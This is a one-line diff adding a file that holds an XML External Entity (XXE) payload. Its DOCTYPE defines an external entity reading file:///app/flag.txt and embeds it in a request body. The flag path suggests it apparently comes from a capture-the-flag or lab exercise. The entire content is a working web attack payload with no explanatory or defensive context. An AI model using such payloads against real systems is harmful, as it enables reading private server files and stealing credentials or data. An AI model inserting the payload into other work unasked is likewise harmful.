@@ -1,0 +1,1 @@
+﻿<!DOCTYPE foo [  <!ENTITY xxe SYSTEM "file:///app/flag.txt">]><request>  <data>&xxe;</data></request>
